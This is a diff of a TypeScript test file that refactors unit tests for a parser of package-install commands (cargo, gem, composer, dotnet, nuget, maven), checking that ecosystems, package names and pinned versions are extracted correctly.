 	it("cargo install ripgrep@13.0.0 → version captured", () => {
-		const [cmd] = parseInstallCommands("cargo install ripgrep@13.0.0");
+		const cmd = nonNull(parseInstallCommands("cargo install ripgrep@13.0.0")[0]);
 		expect(cmd.packages).toEqual([
 			{ kind: "registry", name: "ripgrep", version: "13.0.0" },
 		]);
 	});
 
 	it("gem install x -v 1.2.3 → version captured, no phantom package", () => {
-		const [cmd] = parseInstallCommands("gem install rails -v 7.1.0");
+		const cmd = nonNull(parseInstallCommands("gem install rails -v 7.1.0")[0]);
 		expect(cmd.packages).toEqual([{ kind: "registry", name: "rails", version: "7.1.0" }]);
 	});
 
 	it("gem install x --version 1.2.3 → version captured", () => {
-		const [cmd] = parseInstallCommands("gem install rails --version 7.1.0");
+		const cmd = nonNull(parseInstallCommands("gem install rails --version 7.1.0")[0]);
 		expect(cmd.packages).toEqual([{ kind: "registry", name: "rails", version: "7.1.0" }]);
 	});
 
 	it("cargo add --git URL still yields a git_url spec (unchanged)", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"cargo add --git https://github.com/foo/bar foo",
-		);
+		)[0]);
 		expect(cmd.packages.some((p) => p.kind === "git_url")).toBe(true);
 	});
 });
@@ -846,21 +847,21 @@ describe("pinnedVersionViolation — per-ecosystem unit cases", () => {
 
 describe("parseInstallCommands — composer / nuget / maven ecosystems", () => {
 	it("routes composer require to the composer ecosystem", () => {
-		const [cmd] = parseInstallCommands("composer require monolog/monolog:2.9.1");
+		const cmd = nonNull(parseInstallCommands("composer require monolog/monolog:2.9.1")[0]);
 		expect(cmd?.ecosystem).toBe("composer");
 		expect(cmd?.packages[0]).toMatchObject({ name: "monolog/monolog", version: "2.9.1" });
 	});
 	it("routes dotnet add package to nuget", () => {
-		const [cmd] = parseInstallCommands("dotnet add package Newtonsoft.Json --version 13.0.1");
+		const cmd = nonNull(parseInstallCommands("dotnet add package Newtonsoft.Json --version 13.0.1")[0]);
 		expect(cmd?.ecosystem).toBe("nuget");
 		expect(cmd?.packages[0]).toMatchObject({ name: "Newtonsoft.Json", version: "13.0.1" });
 	});
 	it("routes nuget install to nuget", () => {
-		const [cmd] = parseInstallCommands("nuget install Moq -Version 4.20.70");
+		const cmd = nonNull(parseInstallCommands("nuget install Moq -Version 4.20.70")[0]);
 		expect(cmd?.ecosystem).toBe("nuget");
 	});
 	it("routes mvn dependency:get to maven", () => {
-		const [cmd] = parseInstallCommands("mvn dependency:get -Dartifact=org.foo:bar:1.0.0");
+		const cmd = nonNull(parseInstallCommands("mvn dependency:get -Dartifact=org.foo:bar:1.0.0")[0]);
 		expect(cmd?.ecosystem).toBe("maven");
 		expect(cmd?.packages[0]).toMatchObject({ name: "org.foo:bar", version: "1.0.0" });
 	});
